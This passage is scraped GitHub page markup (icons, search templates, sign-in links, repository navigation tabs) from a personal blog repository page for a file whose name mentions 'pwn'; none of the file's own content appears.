16h12.5A1.75 1.75 0 0016 14.25V1.75A1.75 1.75 0 0014.25 0H1.75zM1.5 1.75a.25.25 0 01.25-.25h12.5a.25.25 0 01.25.25v12.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25V1.75zM11.75 3a.75.75 0 00-.75.75v7.5a.75.75 0 001.5 0v-7.5a.75.75 0 00-.75-.75zm-8.25.75a.75.75 0 011.5 0v5.5a.75.75 0 01-1.5 0v-5.5zM8 3a.75.75 0 00-.75.75v3.5a.75.75 0 001.5 0v-3.5A.75.75 0 008 3z"></path></svg>      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M11.5 7a4.499 4.499 0 11-8.998 0A4.499 4.499 0 0111.5 7zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path></svg>    </div><pre><code>&lt;img class=&quot;avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none&quot; alt=&quot;&quot; aria-label=&quot;Team&quot; src=&quot;&quot; width=&quot;28&quot; height=&quot;28&quot;&gt;&lt;div class=&quot;jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target&quot;&gt;&lt;/div&gt;&lt;div class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none js-jump-to-badge-search&quot;&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-default d-none&quot; aria-label=&quot;in this user&quot;&gt;    In this user  &lt;/span&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-global d-none&quot; aria-label=&quot;in all of GitHub&quot;&gt;    All GitHub  &lt;/span&gt;  &lt;span aria-hidden=&quot;true&quot; class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;&lt;div aria-hidden=&quot;true&quot; class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump&quot;&gt;  Jump to  &lt;span class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;</code></pre>  </a></li><li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-global-search d-none" role="option">  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="global_search">    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path></svg>      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M1.75 0A1.75 1.75 0 000 1.75v12.5C0 15.216.784 16 1.75 16h12.5A1.75 1.75 0 0016 14.25V1.75A1.75 1.75 0 0014.25 0H1.75zM1.5 1.75a.25.25 0 01.25-.25h12.5a.25.25 0 01.25.25v12.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25V1.75zM11.75 3a.75.75 0 00-.75.75v7.5a.75.75 0 001.5 0v-7.5a.75.75 0 00-.75-.75zm-8.25.75a.75.75 0 011.5 0v5.5a.75.75 0 01-1.5 0v-5.5zM8 3a.75.75 0 00-.75.75v3.5a.75.75 0 001.5 0v-3.5A.75.75 0 008 3z"></path></svg>      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M11.5 7a4.499 4.499 0 11-8.998 0A4.499 4.499 0 0111.5 7zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path></svg>    </div><pre><code>&lt;img class=&quot;avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none&quot; alt=&quot;&quot; aria-label=&quot;Team&quot; src=&quot;&quot; width=&quot;28&quot; height=&quot;28&quot;&gt;&lt;div class=&quot;jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target&quot;&gt;&lt;/div&gt;&lt;div class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none js-jump-to-badge-search&quot;&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-default d-none&quot; aria-label=&quot;in this repository&quot;&gt;    In this repository  &lt;/span&gt;  &lt;span class=&quot;js-jump-to-badge-search-text-global d-none&quot; aria-label=&quot;in all of GitHub&quot;&gt;    All GitHub  &lt;/span&gt;  &lt;span aria-hidden=&quot;true&quot; class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;&lt;div aria-hidden=&quot;true&quot; class=&quot;border rounded-1 flex-shrink-0 color-bg-tertiary px-1 color-text-tertiary ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump&quot;&gt;  Jump to  &lt;span class=&quot;d-inline-block ml-1 v-align-middle&quot;&gt;↵&lt;/span&gt;&lt;/div&gt;</code></pre>  </a></li></ul><pre><code>        &lt;/div&gt;  &lt;/label&gt;</code></pre></form>  </div></div><pre><code>      &lt;/div&gt;    &lt;a href=&quot;/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io%2Fblob%2Fmaster%2Fbackup_md%2F2021-01-25-pwn.md&quot;      class=&quot;HeaderMenu-link flex-shrink-0 no-underline mr-3&quot;      data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;location_in_page&amp;quot;:&amp;quot;site header menu&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;091f95ff310166f64f9b3ecbbfc6c31a183168a9f00141cea25d7b69e0ebd17e&quot;      data-ga-click=&quot;(Logged out) Header, clicked Sign in, text:sign-in&quot;&gt;      Sign in    &lt;/a&gt;        &lt;a href=&quot;/join?ref_cta=Sign+up&amp;amp;ref_loc=header+logged+out&amp;amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;amp;source=header-repo&amp;amp;source_repo=wjddnjs33%2Fwjddnjs33.github.io&quot;          class=&quot;HeaderMenu-link flex-shrink-0 d-inline-block no-underline border color-border-tertiary rounded px-2 py-1 js-signup-redesign-target js-signup-redesign-control&quot;          data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;location_in_page&amp;quot;:&amp;quot;site header menu&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;091f95ff310166f64f9b3ecbbfc6c31a183168a9f00141cea25d7b69e0ebd17e&quot;          data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;analytics.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;category&amp;quot;:&amp;quot;Sign up&amp;quot;,&amp;quot;action&amp;quot;:&amp;quot;click to sign up for account&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;ref_page:/&amp;lt;user-name&amp;gt;/&amp;lt;repo-name&amp;gt;/blob/show;ref_cta:Sign up;ref_loc:header logged out&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;9c1bef43174ac017ddb7412c499d5d16f1656e40af2225489c6c23354261b7bf&quot;        &gt;          Sign up        &lt;/a&gt;        &lt;a href=&quot;/join_next?ref_cta=Sign+up&amp;amp;ref_loc=header+logged+out&amp;amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;amp;source=header-repo&amp;amp;source_repo=wjddnjs33%2Fwjddnjs33.github.io&quot;          class=&quot;HeaderMenu-link flex-shrink-0 d-inline-block no-underline border color-border-tertiary rounded-1 px-2 py-1 js-signup-redesign-target js-signup-redesign-variation&quot;          hidden          data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;location_in_page&amp;quot;:&amp;quot;site header menu&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;091f95ff310166f64f9b3ecbbfc6c31a183168a9f00141cea25d7b69e0ebd17e&quot;          data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;analytics.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;category&amp;quot;:&amp;quot;Sign up&amp;quot;,&amp;quot;action&amp;quot;:&amp;quot;click to sign up for account&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;ref_page:/&amp;lt;user-name&amp;gt;/&amp;lt;repo-name&amp;gt;/blob/show;ref_cta:Sign up;ref_loc:header logged out&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;9c1bef43174ac017ddb7412c499d5d16f1656e40af2225489c6c23354261b7bf&quot;        &gt;          Sign up        &lt;/a&gt;  &lt;/div&gt;&lt;/div&gt;</code></pre>  </div></header><pre><code>&lt;/div&gt;</code></pre>  <div id="start-of-content" class="show-on-focus"></div><pre><code>&lt;div data-pjax-replace id=&quot;js-flash-container&quot;&gt;</code></pre>  <template class="js-flash-template">    <div class="flash flash-full  ">  <div class=" px-2" >    <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">      <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>    </button>          <div></div>  </div></div>  </template></div><p>  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment></p>  <div    class="application-main "    data-commit-hovercards-enabled    data-discussion-hovercards-enabled    data-issue-and-pr-hovercards-enabled  >          <div itemscope itemtype="http://schema.org/SoftwareSourceCode" class="">    <main id="js-repo-pjax-container" data-pjax-container >        <div class="color-bg-secondary pt-3 hide-full-screen mb-5"><pre><code>  &lt;div class=&quot;d-flex mb-3 px-3 px-md-4 px-lg-5&quot;&gt;    &lt;div class=&quot;flex-auto min-width-0 width-fit mr-3&quot;&gt;        &lt;h1 class=&quot; d-flex flex-wrap flex-items-center break-word f3 text-normal&quot;&gt;&lt;svg class=&quot;octicon octicon-repo color-text-secondary mr-2&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;span class=&quot;author flex-self-stretch&quot; itemprop=&quot;author&quot;&gt;  &lt;a class=&quot;url fn&quot; rel=&quot;author&quot; data-hovercard-type=&quot;user&quot; data-hovercard-url=&quot;/users/wjddnjs33/hovercard&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;/wjddnjs33&quot;&gt;wjddnjs33&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;mx-1 flex-self-stretch color-text-secondary&quot;&gt;/&lt;/span&gt;</code></pre>  <strong itemprop="name" class="mr-2 flex-self-stretch">    <a data-pjax="#js-repo-pjax-container" class="" href="/wjddnjs33/wjddnjs33.github.io">wjddnjs33.github.io</a>  </strong>  </h1><pre><code>    &lt;/div&gt;      &lt;ul class=&quot;pagehead-actions flex-shrink-0 d-none d-md-inline&quot; style=&quot;padding: 2px 0;&quot;&gt;</code></pre>  <li>      <a class="tooltipped tooltipped-s btn btn-sm rounded-right-0" aria-label="You must be signed in to change notification settings" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8b114caa7d82ca07faaa45d5c96d645ea624be6edccd52a4c9a242af9e10438a" href="/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io">    <svg class="octicon octicon-bell" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path d="M8 16a2 2 0 001.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 008 16z"></path><path fill-rule="evenodd" d="M8 1.5A3.5 3.5 0 004.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.018.018 0 00-.003.01l.001.006c0 .002.002.004.004.006a.017.017 0 00.006.004l.007.001h10.964l.007-.001a.016.016 0 00.006-.004.016.016 0 00.004-.006l.001-.007a.017.017 0 00-.003-.01l-1.703-2.554a1.75 1.75 0 01-.294-.97V5A3.5 3.5 0 008 1.5zM3 5a5 5 0 0110 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.518 1.518 0 0113.482 13H2.518a1.518 1.518 0 01-1.263-2.36l1.703-2.554A.25.25 0 003 7.947V5z"></path></svg>    Notifications</a>  </li>  <li>          <a class="btn btn-sm btn-with-count  tooltipped tooltipped-s" aria-label="You must be signed in to star a repository" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:333657172,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a1996fb50a29bd3fd98bac649c267a4004e98de1ee003b11411eee568ce35d8a" href="/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io">      <svg class="octicon octicon-star v-align-text-bottom mr-1" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"></path></svg>      <span>        Star</span></a>    <a class="social-count js-social-count" href="/wjddnjs33/wjddnjs33.github.io/stargazers"      aria-label="0 users starred this repository">      0    </a>  </li>  <li>        <a class="btn btn-sm btn-with-count tooltipped tooltipped-s" aria-label="You must be signed in to fork a repository" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:333657172,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="b2b773f0c3fa7ef71ed4e7ede5be489845350a9539a6c3df3bcf52cf8a1a04b2" href="/login?return_to=%2Fwjddnjs33%2Fwjddnjs33.github.io">          <svg class="octicon octicon-repo-forked" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5 3.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm0 2.122a2.25 2.25 0 10-1.5 0v.878A2.25 2.25 0 005.75 8.5h1.5v2.128a2.251 2.251 0 101.5 0V8.5h1.5a2.25 2.25 0 002.25-2.25v-.878a2.25 2.25 0 10-1.5 0v.878a.75.75 0 01-.75.75h-4.5A.75.75 0 015 6.25v-.878zm3.75 7.378a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm3-8.75a.75.75 0 100-1.5.75.75 0 000 1.5z"></path></svg>          Fork</a>      <a href="/wjddnjs33/wjddnjs33.github.io/network/members" class="social-count"         aria-label="0 users forked this repository">        0      </a>  </li></ul><pre><code>  &lt;/div&gt;    </code></pre><nav aria-label="Repository" data-pjax="#js-repo-pjax-container" class="js-repo-nav js-sidenav-container-pjax js-responsive-underlinenav overflow-hidden UnderlineNav px-3 px-md-4 px-lg-5 bg-gray-light">  <ul class="UnderlineNav-body list-style-none ">      <li class="d-flex">        <a class="js-selected-navigation-item selected UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item" data-tab-item="i0code-tab" data-hotkey="g c" data-ga-click="Repository, Navigation click, Code tab" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments /wjddnjs33/wjddnjs33.github.io" href="/wjddnjs33/wjddnjs33.github.io">              <svg class="octicon octicon-code UnderlineNav-octicon d-none d-sm-inline" height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M4.72 3.22a.75.75 0 011.06 1.06L2.06 8l3.72 3.72a.75.75 0 11-1.06 1.06L.47 8.53a.75.75 0 010-1.06l4.25-4.25zm6.56 0a.75.75 0 10-1.06 1.06L13.94 8l-3.72 3.72a.75.75 0 101.06 1.06l4.25-4.25a.75.75 0 000-1.06l-4.25-4.25z"></path></svg>            <span data-content="Code">Code</span>              <span title="Not available" class="Counter "></span></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i1issues-tab&quot; data-hotkey=&quot;g i&quot; data-ga-click=&quot;Repository, Navigation click, Issues tab&quot; data-selected-links=&quot;repo_issues repo_labels repo_milestones /wjddnjs33/wjddnjs33.github.io/issues&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/issues&quot;&gt;          &lt;svg class=&quot;octicon octicon-issue-opened UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm9 3a1 1 0 11-2 0 1 1 0 012 0zm-.25-6.25a.75.75 0 00-1.5 0v3.5a.75.75 0 001.5 0v-3.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Issues&quot;&gt;Issues&lt;/span&gt;          &lt;span title=&quot;0&quot; hidden=&quot;hidden&quot; class=&quot;Counter &quot;&gt;0&lt;/span&gt;</code></pre></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i2pull-requests-tab&quot; data-hotkey=&quot;g p&quot; data-ga-click=&quot;Repository, Navigation click, Pull requests tab&quot; data-selected-links=&quot;repo_pulls checks /wjddnjs33/wjddnjs33.github.io/pulls&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/pulls&quot;&gt;          &lt;svg class=&quot;octicon octicon-git-pull-request UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Pull requests&quot;&gt;Pull requests&lt;/span&gt;          &lt;span title=&quot;0&quot; hidden=&quot;hidden&quot; class=&quot;Counter &quot;&gt;0&lt;/span&gt;</code></pre></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i3actions-tab&quot; data-hotkey=&quot;g a&quot; data-ga-click=&quot;Repository, Navigation click, Actions tab&quot; data-selected-links=&quot;repo_actions /wjddnjs33/wjddnjs33.github.io/actions&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/actions&quot;&gt;          &lt;svg class=&quot;octicon octicon-play UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M1.5 8a6.5 6.5 0 1113 0 6.5 6.5 0 01-13 0zM8 0a8 8 0 100 16A8 8 0 008 0zM6.379 5.227A.25.25 0 006 5.442v5.117a.25.25 0 00.379.214l4.264-2.559a.25.25 0 000-.428L6.379 5.227z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Actions&quot;&gt;Actions&lt;/span&gt;          &lt;span title=&quot;Not available&quot; class=&quot;Counter &quot;&gt;&lt;/span&gt;</code></pre></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i4projects-tab&quot; data-hotkey=&quot;g b&quot; data-ga-click=&quot;Repository, Navigation click, Projects tab&quot; data-selected-links=&quot;repo_projects new_repo_project repo_project /wjddnjs33/wjddnjs33.github.io/projects&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/projects&quot;&gt;          &lt;svg class=&quot;octicon octicon-project UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M1.75 0A1.75 1.75 0 000 1.75v12.5C0 15.216.784 16 1.75 16h12.5A1.75 1.75 0 0016 14.25V1.75A1.75 1.75 0 0014.25 0H1.75zM1.5 1.75a.25.25 0 01.25-.25h12.5a.25.25 0 01.25.25v12.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25V1.75zM11.75 3a.75.75 0 00-.75.75v7.5a.75.75 0 001.5 0v-7.5a.75.75 0 00-.75-.75zm-8.25.75a.75.75 0 011.5 0v5.5a.75.75 0 01-1.5 0v-5.5zM8 3a.75.75 0 00-.75.75v3.5a.75.75 0 001.5 0v-3.5A.75.75 0 008 3z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Projects&quot;&gt;Projects&lt;/span&gt;          &lt;span title=&quot;0&quot; hidden=&quot;hidden&quot; class=&quot;Counter &quot;&gt;0&lt;/span&gt;</code></pre></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i5security-tab&quot; data-hotkey=&quot;g s&quot; data-ga-click=&quot;Repository, Navigation click, Security tab&quot; data-selected-links=&quot;security overview alerts policy token_scanning code_scanning /wjddnjs33/wjddnjs33.github.io/security&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/security&quot;&gt;          &lt;svg class=&quot;octicon octicon-shield UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.467.133a1.75 1.75 0 011.066 0l5.25 1.68A1.75 1.75 0 0115 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.7 1.7 0 01-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 011.217-1.667l5.25-1.68zm.61 1.429a.25.25 0 00-.153 0l-5.25 1.68a.25.25 0 00-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.2.2 0 00.154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.25.25 0 00-.174-.237l-5.25-1.68zM9 10.5a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.75a.75.75 0 10-1.5 0v3a.75.75 0 001.5 0v-3z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;        &lt;span data-content=&quot;Security&quot;&gt;Security&lt;/span&gt;          &lt;include-fragment src=&quot;/wjddnjs33/wjddnjs33.github.io/security/overall-count&quot; accept=&quot;text/fragment+html&quot;&gt;&lt;/include-fragment&gt;</code></pre></a><pre><code>  &lt;/li&gt;  &lt;li class=&quot;d-flex&quot;&gt;    &lt;a class=&quot;js-selected-navigation-item UnderlineNav-item hx_underlinenav-item no-wrap js-responsive-underlinenav-item&quot; data-tab-item=&quot;i6insights-tab&quot; data-ga-click=&quot;Repository, Navigation click, Insights tab&quot; data-selected-links=&quot;repo_graphs repo_contributors dependency_graph dependabot_updates pulse people /wjddnjs33/wjddnjs33.github.io/pulse&quot; href=&quot;/wjddnjs33/wjddnjs33.github.io/pulse&quot;&gt;          &lt;svg class=&quot;octicon octicon-graph UnderlineNav-octicon d-none d-sm-inline&quot; height=&quot;16&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M1.5 1.75a.75.75 0 